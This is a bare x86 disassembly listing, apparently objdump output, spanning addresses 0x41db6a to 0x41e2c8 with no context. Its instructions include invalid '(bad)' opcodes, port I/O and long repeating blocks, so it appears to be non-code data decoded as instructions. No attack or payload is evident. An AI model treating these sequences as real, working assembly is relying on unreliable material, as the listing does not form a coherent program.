  41db6a:	leave  
  41db6b:	retf   
  41db6c:	xor    eax,0x30ccdcd8
  41db71:	int3   
  41db72:	rcl    al,1
  41db74:	sub    al,0xc0
  41db76:	(bad)  
  41db77:	xlat   BYTE PTR ds:[ebx]
  41db78:	sub    ebx,edx
  41db7a:	(bad)  
  41db7c:	and    eax,0x21dfdddf
  41db81:	fndisi(8087 only) 
  41db83:	jecxz  0x41dba2
  41db85:	out    0xe5,eax
  41db87:	out    0x19,eax
  41db89:	jecxz  0x41db74
  41db8b:	jmp    0x41dba2
  41db8d:	clc    
  41db8e:	cld    
  41db8f:	in     al,dx
  41db90:	adc    ah,ch
  41db92:	lock lock or al,0xe0
  41db96:	in     al,0xe4
  41db98:	clc    
  41db99:	in     al,0xe8
  41db9b:	hlt    
  41db9c:	clc    
  41db9d:	(bad)  
  41db9e:	std    
  41db9f:	inc    DWORD PTR [ecx]
  41dba1:	sti    
  41dba2:	add    DWORD PTR [ebx],eax
  41dba4:	std    
  41dba5:	pop    es
  41dba6:	add    eax,0x18140c00
  41dbab:	sbb    BYTE PTR [eax+ebx*1],al
  41dbae:	sbb    al,0xc
  41dbb0:	lock or al,0x10
  41dbb3:	adc    ah,ch
  41dbb5:	add    BYTE PTR [esp+eax*1],al
  41dbb8:	sbb    BYTE PTR [eax+edx*1],al
  41dbbb:	sbb    esp,ebp
  41dbbd:	pop    ds
  41dbbe:	sbb    eax,0x211be11f
  41dbc3:	and    ebx,ebp
  41dbc5:	daa    
  41dbc6:	and    eax,0x382cd927
  41dbcb:	cmp    BYTE PTR [eax+edi*1],ah
  41dbce:	cmp    al,0x2c
  41dbd0:	shr    BYTE PTR [eax+esi*1],1
  41dbd3:	xor    ah,cl
  41dbd5:	daa    
  41dbd6:	and    al,0x24
  41dbd8:	cmp    al,0x30
  41dbda:	cmp    DWORD PTR [ebx],edi
  41dbdc:	lds    edi,FWORD PTR [edi]
  41dbde:	cmp    eax,0x4339c13f
  41dbe3:	inc    ebx
  41dbe4:	mov    ebp,0xb9474547
  41dbe9:	inc    ebx
  41dbea:	dec    esp
  41dbeb:	inc    esp
  41dbec:	inc    esp
  41dbed:	pop    eax
  41dbee:	pop    ebp
  41dbef:	dec    esp
  41dbf0:	mov    al,0x4c
  41dbf2:	push   eax
  41dbf3:	push   eax
  41dbf4:	pop    esp
  41dbf5:	inc    eax
  41dbf6:	inc    esp
  41dbf7:	pop    esp
  41dbf8:	test   eax,0xa55b5953
  41dbfd:	pop    edi
  41dbfe:	pop    ebp
  41dbff:	pop    edi
  41dc00:	mov    eax,ds:0x9d636a51
  41dc05:	addr16 gs addr16 cdq 
  41dc09:	arpl   WORD PTR [ecx+0x6b],bp
  41dc0c:	ins    BYTE PTR es:[edi],dx
  41dc0d:	js     0x41dc8b
  41dc0f:	jl     0x41dba1
  41dc11:	ins    BYTE PTR es:[edi],dx
  41dc12:	jo     0x41dc74
  41dc14:	jl     0x41dc76
  41dc16:	fs jg  0x41dc8e
  41dc19:	jae    0x41dc94
  41dc1b:	jnp    0x41dba2
  41dc1d:	jg     0x41dc9c
  41dc1f:	jg     0x41dc9b
  41dc21:	ins    BYTE PTR es:[edi],dx
  41dc22:	nop
  41dc23:	xchg   DWORD PTR [ebp-0x79],edi
  41dc26:	test   DWORD PTR [edi-0x70767c87],eax
  41dc2c:	lea    ebx,[eax-0x737f6364]
  41dc32:	nop
  41dc33:	nop
  41dc34:	ins    BYTE PTR es:[edi],dx
  41dc35:	xchg   DWORD PTR [esp+eax*4-0x626f7868],eax
  41dc3c:	gs lahf 
  41dc3e:	popf   
  41dc3f:	sahf   
  41dc40:	xchg   ebp,eax
  41dc41:	mov    WORD PTR [eax-0x5a58a251],?
  41dc47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc49:	lods   al,BYTE PTR ds:[esi]
  41dc4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc4b:	mov    eax,0xacbdb8a4
  41dc50:	push   eax
  41dc51:	lods   al,BYTE PTR ds:[esi]
  41dc52:	mov    al,0xb0
  41dc54:	dec    esp
  41dc55:	mov    al,0xb4
  41dc57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc58:	mov    eax,0xb3a8a8a4
  41dc5d:	mov    cl,0xbe
  41dc5f:	mov    ah,0xb0
  41dc61:	lods   al,BYTE PTR ds:[esi]
  41dc62:	rcl    al,1
  41dc64:	(bad)  
  41dc65:	mov    bl,0xc9
  41dc68:	enter  0xd8d4,0xd8
  41dc6c:	(bad)
  41dc6f:	int3   
  41dc70:	xor    ah,cl
  41dc72:	rcl    al,1
  41dc74:	sub    al,0xd0
  41dc76:	aam    0xd4
  41dc78:	sub    ah,dl
  41dc7a:	leave  
  41dc7b:	enter  0xc8d4,0xd2
  41dc7f:	int3   
  41dc80:	rcr    ah,1
  41dc82:	loopne 0x41dc74
  41dc84:	out    dx,al
  41dc85:	repnz hlt 
  41dc87:	hlt    
  41dc88:	call   0x152ac580
  41dc8d:	call   0xec52c97e
  41dc92:	lock lock or al,0xf0
  41dc96:	hlt    
  41dc97:	hlt    
  41dc98:	or     ah,dh
  41dc9a:	clc    
  41dc9b:	clc    
  41dc9c:	add    al,0xef
  41dc9e:	in     al,dx
  41dc9f:	in     al,dx
  41dca0:	icebp  
  41dca1:	cld    
  41dca2:	add    BYTE PTR [ebx],dl
  41dca4:	or     al,0x10
  41dca6:	adc    eax,0x804f804
  41dcab:	or     ah,dh
  41dcad:	or     BYTE PTR [esp+ecx*1],cl
  41dcb0:	lock or al,0xf0
  41dcb3:	adc    ah,ch
  41dcb5:	sbb    esp,esi
  41dcb7:	adc    al,0xe8
  41dcb9:	sbb    eax,0x11e418f8
  41dcbe:	cld    
  41dcbf:	sbb    al,0xe0
  41dcc1:	adc    eax,0x29dc20c0
  41dcc6:	les    esp,FWORD PTR [eax+ebx*8]
  41dcc9:	sub    eax,0x21d428c8
  41dcce:	int3   
  41dccf:	sub    al,0xd0
  41dcd1:	and    eax,0x39cc30d0
  41dcd6:	aam    0x34
  41dcd8:	enter  0xd83d,0x38
  41dcdc:	les    esi,FWORD PTR [ecx]
  41dcde:	fdivr  QWORD PTR [eax+eax*8]
  41dce1:	xor    eax,0x49bc40a0
  41dce6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dce7:	inc    esp
  41dce8:	mov    eax,0xb448a84d
  41dced:	inc    ecx
  41dcee:	lods   al,BYTE PTR ds:[esi]
  41dcef:	dec    esp
  41dcf0:	mov    al,0x45
  41dcf2:	mov    al,0x50
  41dcf4:	lods   al,BYTE PTR ds:[esi]
  41dcf5:	pop    ecx
  41dcf6:	mov    ah,0x54
  41dcf8:	test   al,0x5d
  41dcfa:	mov    eax,0xbc51a458
  41dcff:	pop    esp
  41dd00:	mov    al,ds:0x9c608055
  41dd05:	imul   eax,DWORD PTR [esp+eiz*2+0x68886d98],0x6c8c6194
  41dd10:	nop
  41dd11:	gs nop
  41dd13:	jo     0x41dca1
  41dd15:	jns    0x41dcab
  41dd17:	je     0x41dca1
  41dd19:	jge    0x41dcd3
  41dd1b:	js     0x41dca1
  41dd1d:	jge    0x41dd1b
  41dd1f:	jl     0x41dca1
  41dd21:	jnp    0x41dd83
  41dd23:	cmp    BYTE PTR [ecx+ecx*4+0x7c],0x84
  41dd28:	js     0x41dccf
  41dd2a:	ja     0x41dcb7
  41dd2c:	hlt    
  41dd2d:	mov    DWORD PTR [ebx+0x6f],esi
  41dd30:	or     ecx,DWORD PTR [ebp-0x6f936f48]
  41dd36:	mov    ah,0x94
  41dd38:	push   0x6498d894
  41dd3d:	cwde   
  41dd3e:	popf   
  41dd3f:	pushf  
  41dd40:	sbb    BYTE PTR [eax+eiz*4+0x24a05ca0],0xb4
  41dd48:	pop    eax
  41dd49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd4a:	test   al,0xa8
  41dd4c:	push   esp
  41dd4d:	test   al,0xac
  41dd4f:	lods   al,BYTE PTR ds:[esi]
  41dd50:	push   eax
  41dd51:	lods   al,BYTE PTR ds:[esi]
  41dd52:	mov    al,0xb0
  41dd54:	dec    esp
  41dd55:	mov    al,0xb4
  41dd57:	mov    ah,0x48
  41dd59:	mov    ah,0xb8
  41dd5b:	mov    eax,0xbcbcb844
  41dd60:	inc    eax
  41dd61:	mov    esp,0xc03cc0c0
  41dd66:	xor    dh,BYTE PTR [edx]
  41dd68:	xor    al,ch
  41dd6a:	ds ds ds leave 
  41dd6e:	cmp    bh,BYTE PTR [edx]
  41dd70:	cmp    cl,ch
  41dd72:	es es shl DWORD PTR es:[edx],1
  41dd77:	and    ah,BYTE PTR [edx]
  41dd79:	aad    0x2e
  41dd7b:	cs fldcw WORD PTR cs:[edx]
  41dd7f:	sub    ch,BYTE PTR [edx]
  41dd81:	fst    QWORD PTR [esi]
  41dd83:	push   ss
  41dd84:	push   ss
  41dd85:	loope  0x41dd99
  41dd87:	adc    dl,BYTE PTR [edx]
  41dd89:	in     eax,0x1e
  41dd8b:	push   ds
  41dd8c:	push   ds
  41dd8d:	jmp    0xed5bf7ac
  41dd92:	push   es
  41dd93:	push   es
  41dd94:	push   es
  41dd95:	icebp  
  41dd96:	add    al,BYTE PTR [edx]
  41dd98:	add    dh,ch
  41dd9a:	push   cs
  41dd9b:	push   cs
  41dd9c:	push   cs
  41dd9d:	stc    
  41dd9e:	or     cl,BYTE PTR [edx]
  41dda0:	or     bh,ch
  41dda2:	div    dh
  41dda4:	test   BYTE PTR [ecx],0xf2
  41dda7:	repnz repnz add eax,0x9fefefe
  41ddae:	cli    
  41ddaf:	cli    
  41ddb0:	cli    
  41ddb1:	or     eax,0x11e6e6e6
  41ddb6:	loop   0x41dd9a
  41ddb8:	loop   0x41ddcf
  41ddba:	out    dx,al
  41ddbb:	out    dx,al
  41ddbc:	out    dx,al
  41ddbd:	sbb    edx,ebp
  41ddbf:	jmp    0x21d6:0xd6d61dea
  41ddc6:	rcl    dl,cl
  41ddc8:	shl    BYTE PTR ds:0x29dedede,cl
  41ddce:	sub    al,0x2c
  41ddd0:	shr    BYTE PTR [eax+esi*1],1
  41ddd3:	xor    ah,cl
  41ddd5:	xor    BYTE PTR [esp+esi*1],dh
  41ddd8:	enter  0x3834,0x38
  41dddc:	les    edi,FWORD PTR [eax]
  41ddde:	cmp    al,0x3c
  41dde0:	sar    BYTE PTR [eax+eax*2],0x40
  41dde4:	mov    esp,0xb2b2b240
  41dde9:	inc    ebp
  41ddea:	mov    esi,0xba49bebe
  41ddef:	mov    edx,0xa6a64dba
  41ddf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddf5:	push   ecx
  41ddf6:	mov    ds:0xae55a2a2,al
  41ddfb:	scas   al,BYTE PTR es:[edi]
  41ddfc:	scas   al,BYTE PTR es:[edi]
  41ddfd:	pop    ecx
  41ddfe:	stos   BYTE PTR es:[edi],al
  41ddff:	stos   BYTE PTR es:[edi],al
  41de00:	stos   BYTE PTR es:[edi],al
  41de01:	pop    ebp
  41de02:	xchg   esi,eax
  41de03:	xchg   esi,eax
  41de04:	xchg   esi,eax
  41de05:	popa   
  41de06:	xchg   edx,eax
  41de07:	xchg   edx,eax
  41de08:	xchg   edx,eax
  41de09:	gs sahf 
  41de0b:	sahf   
  41de0c:	sahf   
  41de0d:	imul   ebx,DWORD PTR [edx-0x79926566],0x82718686
  41de17:	add    BYTE PTR [edx-0x7171718b],0x79
  41de1e:	mov    cl,BYTE PTR [edx+0x76767d8a]
  41de24:	jbe    0x41dda7
  41de26:	jb     0x41de9a
  41de28:	jb     0x41ddaf
  41de2a:	jle    0x41deaa
  41de2c:	jle    0x41ddb7
  41de2e:	jp     0x41deaa
  41de30:	jp     0x41ddbf
  41de32:	data16 data16 xchg cx,ax
  41de36:	bound  esp,QWORD PTR [edx+0x62]
  41de39:	xchg   ebp,eax
  41de3a:	outs   dx,BYTE PTR ds:[esi]
  41de3b:	outs   dx,BYTE PTR ds:[esi]
  41de3c:	outs   dx,BYTE PTR ds:[esi]
  41de3d:	cdq    
  41de3e:	push   0x6a
  41de40:	push   0xffffff9d
  41de42:	push   esi
  41de43:	push   esi
  41de44:	push   esi
  41de45:	mov    eax,ds:0xa5525252
  41de4a:	pop    esi
  41de4b:	pop    esi
  41de4c:	pop    esi
  41de4d:	test   eax,0xac50acac
  41de52:	mov    al,0xb0
  41de54:	dec    esp
  41de55:	mov    al,0xb4
  41de57:	mov    ah,0x48
  41de59:	mov    ah,0xb8
  41de5b:	mov    eax,0xbcbcb844
  41de60:	inc    eax
  41de61:	mov    esp,0xc03cc0c0
  41de66:	xor    dh,BYTE PTR [edx]
  41de68:	xor    al,ch
  41de6a:	ds ds ds leave 
  41de6e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41de74:	xchg   edx,eax
  41de75:	rcl    DWORD PTR [esi-0x652a696a],1
  41de7b:	call   0xdd9e:0x9e9ed99a
  41de82:	mov    ds:0xa6e1a2a2,al
  41de87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de89:	in     eax,0xaa
  41de8b:	stos   BYTE PTR es:[edi],al
  41de8c:	stos   BYTE PTR es:[edi],al
  41de8d:	jmp    0xedf08d40
  41de92:	mov    dl,0xb2
  41de94:	mov    dl,0xf1
  41de96:	mov    dh,0xb6
  41de98:	mov    dh,0xf5
  41de9a:	mov    edx,0xbef9baba
  41de9f:	mov    esi,0x4242fdbe
  41dea4:	inc    edx
  41dea5:	add    DWORD PTR [esi+0x46],eax
  41dea8:	inc    esi
  41dea9:	add    eax,0x94a4a4a
  41deae:	dec    esi
  41deaf:	dec    esi
  41deb0:	dec    esi
  41deb1:	or     eax,0x11525252
  41deb6:	push   esi
  41deb7:	push   esi
  41deb8:	push   esi
  41deb9:	adc    eax,0x195a5a5a
  41debe:	pop    esi
  41debf:	pop    esi
  41dec0:	pop    esi
  41dec1:	sbb    eax,0x21626262
  41dec6:	rcl    dl,cl
  41dec8:	shl    BYTE PTR ds:0x29dedede,cl
  41dece:	sub    al,0x2c
  41ded0:	shr    BYTE PTR [eax+esi*1],1
  41ded3:	xor    ah,cl
  41ded5:	xor    BYTE PTR [esp+esi*1],dh
  41ded8:	enter  0x3834,0x38
  41dedc:	les    edi,FWORD PTR [eax]
  41dede:	cmp    al,0x3c
  41dee0:	sar    BYTE PTR [eax+eax*2],0x40
  41dee4:	mov    esp,0xb2b2b240
  41dee9:	inc    ebp
  41deea:	mov    esi,0xe49bebe
  41deef:	push   cs
  41def0:	push   cs
  41def1:	dec    ebp
  41def2:	adc    dl,BYTE PTR [edx]
  41def4:	adc    dl,BYTE PTR [ecx+0x16]
  41def7:	push   ss
  41def8:	push   ss
  41def9:	push   ebp
  41defa:	sbb    bl,BYTE PTR [edx]
  41defc:	sbb    bl,BYTE PTR [ecx+0x1e]
  41deff:	push   ds
  41df00:	push   ds
  41df01:	pop    ebp
  41df02:	and    ah,BYTE PTR [edx]
  41df04:	and    ah,BYTE PTR [ecx+0x26]
  41df07:	es es sub ch,BYTE PTR gs:[edx]
  41df0c:	sub    ch,BYTE PTR [ecx+0x2e]
  41df0f:	cs cs ins DWORD PTR es:[edi],dx
  41df12:	xor    dh,BYTE PTR [edx]
  41df14:	xor    dh,BYTE PTR [ecx+0x36]
  41df17:	ss ss jne 0x41df55
  41df1b:	cmp    bh,BYTE PTR [edx]
  41df1d:	jns    0x41df5d
  41df1f:	ds ds jge 0x41dee5
  41df23:	ret    0x81c2
  41df26:	mov    dh,0xc6
  41df29:	test   edx,ecx
  41df2b:	retf   0x89ca
  41df2e:	into   
  41df2f:	into   
  41df30:	into   
  41df31:	(bad)  
  41df32:	rcl    dl,cl
  41df34:	rcl    BYTE PTR [ecx-0x6a29292a],cl
  41df3a:	fcmovu st,st(2)
  41df3c:	ficomp DWORD PTR [ecx-0x62212122]
  41df42:	loop   0x41df26
  41df44:	loop   0x41dee7
  41df46:	push   edx
  41df47:	push   edx
  41df48:	push   edx
  41df49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df4a:	pop    esi
  41df4b:	pop    esi
  41df4c:	pop    esi
  41df4d:	test   eax,0xac50acac
  41df52:	mov    al,0xb0
  41df54:	dec    esp
  41df55:	mov    al,0xb4
  41df57:	mov    ah,0x48
  41df59:	mov    ah,0xb8
  41df5b:	mov    eax,0xbcbcb844
  41df60:	inc    eax
  41df61:	mov    esp,0xc03cc0c0
  41df66:	xor    dh,BYTE PTR [edx]
  41df68:	xor    al,ch
  41df6a:	ds ds ds leave 
  41df6e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41df74:	xchg   edx,eax
  41df75:	rcl    DWORD PTR [esi-0x652a696a],1
  41df7b:	call   0xdd9e:0x9e9ed99a
  41df82:	mov    ds:0xa6e1a2a2,al
  41df87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df89:	in     eax,0xaa
  41df8b:	stos   BYTE PTR es:[edi],al
  41df8c:	stos   BYTE PTR es:[edi],al
  41df8d:	jmp    0xedf08e40
  41df92:	mov    dl,0xb2
  41df94:	mov    dl,0xf1
  41df96:	mov    dh,0xb6
  41df98:	mov    dh,0xf5
  41df9a:	mov    edx,0xbef9baba
  41df9f:	mov    esi,0x4242fdbe
  41dfa4:	inc    edx
  41dfa5:	add    DWORD PTR [esi+0x46],eax
  41dfa8:	inc    esi
  41dfa9:	add    eax,0x94a4a4a
  41dfae:	dec    esi
  41dfaf:	dec    esi
  41dfb0:	dec    esi
  41dfb1:	or     eax,0x11525252
  41dfb6:	push   esi
  41dfb7:	push   esi
  41dfb8:	push   esi
  41dfb9:	adc    eax,0x195a5a5a
  41dfbe:	pop    esi
  41dfbf:	pop    esi
  41dfc0:	pop    esi
  41dfc1:	sbb    eax,0x21626262
  41dfc6:	rcl    dl,cl
  41dfc8:	shl    BYTE PTR ds:0x29dedede,cl
  41dfce:	sub    al,0x2c
  41dfd0:	shr    BYTE PTR [eax+esi*1],1
  41dfd3:	xor    ah,cl
  41dfd5:	xor    BYTE PTR [esp+esi*1],dh
  41dfd8:	enter  0x3834,0x38
  41dfdc:	les    edi,FWORD PTR [eax]
  41dfde:	cmp    al,0x3c
  41dfe0:	sar    BYTE PTR [eax+eax*2],0x40
  41dfe4:	mov    esp,0xb2b2b240
  41dfe9:	inc    ebp
  41dfea:	mov    esi,0xe49bebe
  41dfef:	push   cs
  41dff0:	push   cs
  41dff1:	dec    ebp
  41dff2:	adc    dl,BYTE PTR [edx]
  41dff4:	adc    dl,BYTE PTR [ecx+0x16]
  41dff7:	push   ss
  41dff8:	push   ss
  41dff9:	push   ebp
  41dffa:	test   eax,0xad59b4a9
  41dfff:	lods   eax,DWORD PTR ds:[esi]
  41e000:	mov    al,0x5d
  41e002:	xchg   ecx,eax
  41e003:	xchg   ecx,eax
  41e004:	mov    WORD PTR [ecx-0x6b],fs
  41e007:	xchg   ebp,eax
  41e008:	mov    BYTE PTR [ebp-0x67],ah
  41e00b:	cdq    
  41e00c:	test   BYTE PTR [ecx-0x63],ch
  41e00f:	popf   
  41e010:	sub    BYTE PTR [ebp+0x32],0x32
  41e014:	xor    dh,BYTE PTR [ecx+0x36]
  41e017:	ss ss jne 0x41e055
  41e01b:	cmp    bh,BYTE PTR [edx]
  41e01d:	jns    0x41e05d
  41e01f:	ds ds jge 0x41e094
  41e023:	jno    0x41e091
  41e025:	xor    DWORD PTR [ebp+0x75],0x79798568
  41e02c:	mov    DWORD PTR fs:[ebp+0x7d],edi
  41e030:	pusha  
  41e031:	lea    esp,[ecx+0x61]
  41e034:	jl     0x41dfc7
  41e036:	gs gs js 0x41dfcf
  41e03a:	fcmovu st,st(2)
  41e03c:	ficomp DWORD PTR [ecx-0x62212122]
  41e042:	loop   0x41e026
  41e044:	loop   0x41dfe7
  41e046:	push   edx
  41e047:	push   edx
  41e048:	push   edx
  41e049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e04a:	pop    esi
  41e04b:	pop    esi
  41e04c:	pop    esi
  41e04d:	test   eax,0xac50acac
  41e052:	mov    al,0xb0
  41e054:	dec    esp
  41e055:	mov    al,0xb4
  41e057:	mov    ah,0x48
  41e059:	mov    ah,0xb8
  41e05b:	mov    eax,0xbcbcb844
  41e060:	inc    eax
  41e061:	mov    esp,0xc03cc0c0
  41e066:	xor    dh,BYTE PTR [edx]
  41e068:	xor    al,ch
  41e06a:	ds ds ds leave 
  41e06e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41e074:	xchg   edx,eax
  41e075:	rcl    DWORD PTR [esi+0x29d59696],1
  41e07b:	sub    DWORD PTR [ecx+ebx*8],esi
  41e07e:	sub    eax,0x11dd302d
  41e083:	adc    DWORD PTR [ecx+eiz*8],ecx
  41e086:	adc    eax,0x19e50815
  41e08b:	sbb    DWORD PTR [ecx+ebp*8],eax
  41e08e:	sbb    eax,0xb2ed001d
  41e093:	mov    dl,0xb2
  41e095:	icebp  
  41e096:	mov    dh,0xb6
  41e098:	mov    dh,0xf5
  41e09a:	mov    edx,0xbef9baba
  41e09f:	mov    esi,0xf1f1fdbe
  41e0a4:	in     al,dx
  41e0a5:	add    ebp,esi
  41e0a7:	cmc    
  41e0a8:	call   0xe53bd9b2
  41e0ad:	or     ebp,edi
  41e0af:	std    
  41e0b0:	loopne 0x41e0bf
  41e0b2:	loope  0x41e095
  41e0b4:	cld    
  41e0b5:	adc    ebp,esp
  41e0b7:	in     eax,0xf8
  41e0b9:	adc    eax,0x195a5a5a
  41e0be:	pop    esi
  41e0bf:	pop    esi
  41e0c0:	pop    esi
  41e0c1:	sbb    eax,0x21626262
  41e0c6:	rcl    dl,cl
  41e0c8:	shl    BYTE PTR ds:0x29dedede,cl
  41e0ce:	sub    al,0x2c
  41e0d0:	shr    BYTE PTR [eax+esi*1],1
  41e0d3:	xor    ah,cl
  41e0d5:	xor    BYTE PTR [esp+esi*1],dh
  41e0d8:	enter  0x3834,0x38
  41e0dc:	les    edi,FWORD PTR [eax]
  41e0de:	cmp    al,0x3c
  41e0e0:	sar    BYTE PTR [eax+eax*2],0x40
  41e0e4:	mov    esp,0xb2b2b240
  41e0e9:	inc    ebp
  41e0ea:	mov    esi,0xe49bebe
  41e0ef:	push   cs
  41e0f0:	push   cs
  41e0f1:	dec    ebp
  41e0f2:	adc    dl,BYTE PTR [edx]
  41e0f4:	adc    dl,BYTE PTR [ecx+0x16]
  41e0f7:	push   ss
  41e0f8:	push   ss
  41e0f9:	push   ebp
  41e0fa:	test   eax,0xad59b4a9
  41e0ff:	lods   eax,DWORD PTR ds:[esi]
  41e100:	mov    al,0x5d
  41e102:	xchg   ecx,eax
  41e103:	xchg   ecx,eax
  41e104:	mov    WORD PTR [ecx-0x6b],fs
  41e107:	xchg   ebp,eax
  41e108:	mov    BYTE PTR [ebp-0x67],ah
  41e10b:	cdq    
  41e10c:	test   BYTE PTR [ecx-0x63],ch
  41e10f:	popf   
  41e110:	sub    BYTE PTR [ebp+0x32],0x32
  41e114:	xor    dh,BYTE PTR [ecx+0x36]
  41e117:	ss ss jne 0x41e155
  41e11b:	cmp    bh,BYTE PTR [edx]
  41e11d:	jns    0x41e15d
  41e11f:	ds ds jge 0x41e194
  41e123:	jno    0x41e191
  41e125:	xor    DWORD PTR [ebp+0x75],0x79798568
  41e12c:	mov    DWORD PTR fs:[ebp+0x7d],edi
  41e130:	pusha  
  41e131:	lea    esp,[ecx+0x61]
  41e134:	jl     0x41e0c7
  41e136:	gs gs js 0x41e0cf
  41e13a:	fcmovu st,st(2)
  41e13c:	ficomp DWORD PTR [ecx-0x62212122]
  41e142:	loop   0x41e126
  41e144:	loop   0x41e0e7
  41e146:	push   edx
  41e147:	push   edx
  41e148:	push   edx
  41e149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e14a:	pop    esi
  41e14b:	pop    esi
  41e14c:	pop    esi
  41e14d:	test   eax,0xac50acac
  41e152:	mov    al,0xb0
  41e154:	dec    esp
  41e155:	mov    al,0xb4
  41e157:	mov    ah,0x48
  41e159:	mov    ah,0xb8
  41e15b:	mov    eax,0xbcbcb844
  41e160:	inc    eax
  41e161:	mov    esp,0xc03cc0c0
  41e166:	xor    dh,BYTE PTR [edx]
  41e168:	xor    al,ch
  41e16a:	ds ds ds leave 
  41e16e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41e174:	xchg   edx,eax
  41e175:	rcl    DWORD PTR [esi+0x29d59696],1
  41e17b:	sub    DWORD PTR [ecx+ebx*8],esi
  41e17e:	sub    eax,0x11dd302d
  41e183:	adc    DWORD PTR [ecx+eiz*8],ecx
  41e186:	adc    eax,0x19e50815
  41e18b:	sbb    DWORD PTR [ecx+ebp*8],eax
  41e18e:	sbb    eax,0xb2ed001d
  41e193:	mov    dl,0xb2
  41e195:	icebp  
  41e196:	mov    dh,0xb6
  41e198:	mov    dh,0xf5
  41e19a:	mov    edx,0xbef9baba
  41e19f:	mov    esi,0xf1f1fdbe
  41e1a4:	in     al,dx
  41e1a5:	add    ebp,esi
  41e1a7:	cmc    
  41e1a8:	call   0xe53bdab2
  41e1ad:	or     ebp,edi
  41e1af:	std    
  41e1b0:	loopne 0x41e1bf
  41e1b2:	loope  0x41e195
  41e1b4:	cld    
  41e1b5:	adc    ebp,esp
  41e1b7:	in     eax,0xf8
  41e1b9:	adc    eax,0x195a5a5a
  41e1be:	pop    esi
  41e1bf:	pop    esi
  41e1c0:	pop    esi
  41e1c1:	sbb    eax,0x21626262
  41e1c6:	rcl    dl,cl
  41e1c8:	shl    BYTE PTR ds:0x29dedede,cl
  41e1ce:	sub    al,0x2c
  41e1d0:	shr    BYTE PTR [eax+esi*1],1
  41e1d3:	xor    ah,cl
  41e1d5:	xor    BYTE PTR [esp+esi*1],dh
  41e1d8:	enter  0x3834,0x38
  41e1dc:	les    edi,FWORD PTR [eax]
  41e1de:	cmp    al,0x3c
  41e1e0:	sar    BYTE PTR [eax+eax*2],0x40
  41e1e4:	mov    esp,0xb2b2b240
  41e1e9:	inc    ebp
  41e1ea:	mov    esi,0xe49bebe
  41e1ef:	push   cs
  41e1f0:	push   cs
  41e1f1:	dec    ebp
  41e1f2:	adc    dl,BYTE PTR [edx]
  41e1f4:	adc    dl,BYTE PTR [ecx+0x16]
  41e1f7:	push   ss
  41e1f8:	push   ss
  41e1f9:	push   ebp
  41e1fa:	test   eax,0xad59b4a9
  41e1ff:	lods   eax,DWORD PTR ds:[esi]
  41e200:	mov    al,0x5d
  41e202:	xchg   ecx,eax
  41e203:	xchg   ecx,eax
  41e204:	mov    WORD PTR [ecx-0x6b],fs
  41e207:	xchg   ebp,eax
  41e208:	mov    BYTE PTR [ebp-0x67],ah
  41e20b:	cdq    
  41e20c:	test   BYTE PTR [ecx-0x63],ch
  41e20f:	popf   
  41e210:	sub    BYTE PTR [ebp+0x32],0x32
  41e214:	xor    dh,BYTE PTR [ecx+0x36]
  41e217:	ss ss jne 0x41e255
  41e21b:	cmp    bh,BYTE PTR [edx]
  41e21d:	jns    0x41e25d
  41e21f:	ds ds jge 0x41e294
  41e223:	jno    0x41e291
  41e225:	xor    DWORD PTR [ebp+0x75],0x79798568
  41e22c:	mov    DWORD PTR fs:[ebp+0x7d],edi
  41e230:	pusha  
  41e231:	lea    esp,[ecx+0x61]
  41e234:	jl     0x41e1c7
  41e236:	gs gs js 0x41e1cf
  41e23a:	fcmovu st,st(2)
  41e23c:	ficomp DWORD PTR [ecx-0x62212122]
  41e242:	loop   0x41e226
  41e244:	loop   0x41e1e7
  41e246:	push   edx
  41e247:	push   edx
  41e248:	push   edx
  41e249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e24a:	pop    esi
  41e24b:	pop    esi
  41e24c:	pop    esi
  41e24d:	test   eax,0xac50acac
  41e252:	mov    al,0xb0
  41e254:	dec    esp
  41e255:	mov    al,0xb4
  41e257:	mov    ah,0x48
  41e259:	mov    ah,0xb8
  41e25b:	mov    eax,0xbcbcb844
  41e260:	inc    eax
  41e261:	mov    esp,0xc03cc0c0
  41e266:	xor    dh,BYTE PTR [edx]
  41e268:	xor    al,ch
  41e26a:	ds ds ds leave 
  41e26e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41e274:	xchg   edx,eax
  41e275:	rcl    DWORD PTR [esi+0x29d59696],1
  41e27b:	sub    DWORD PTR [ecx+ebx*8],esi
  41e27e:	sub    eax,0x11dd302d
  41e283:	adc    DWORD PTR [ecx+eiz*8],ecx
  41e286:	adc    eax,0x19e50815
  41e28b:	sbb    DWORD PTR [ecx+ebp*8],eax
  41e28e:	sbb    eax,0xb2ed001d
  41e293:	mov    dl,0xb2
  41e295:	icebp  
  41e296:	mov    dh,0xb6
  41e298:	mov    dh,0xf5
  41e29a:	mov    edx,0xbef9baba
  41e29f:	mov    esi,0xf1f1fdbe
  41e2a4:	in     al,dx
  41e2a5:	add    ebp,esi
  41e2a7:	cmc    
  41e2a8:	call   0xe53bdbb2
  41e2ad:	or     ebp,edi
  41e2af:	std    
  41e2b0:	loopne 0x41e2bf
  41e2b2:	loope  0x41e295
  41e2b4:	cld    
  41e2b5:	adc    ebp,esp
  41e2b7:	in     eax,0xf8
  41e2b9:	adc    eax,0x195a5a5a
  41e2be:	pop    esi
  41e2bf:	pop    esi
  41e2c0:	pop    esi
  41e2c1:	sbb    eax,0x21626262
  41e2c6:	rcl    dl,cl
  41e2c8:	shl    BYTE PTR ds:0x29dedede,cl
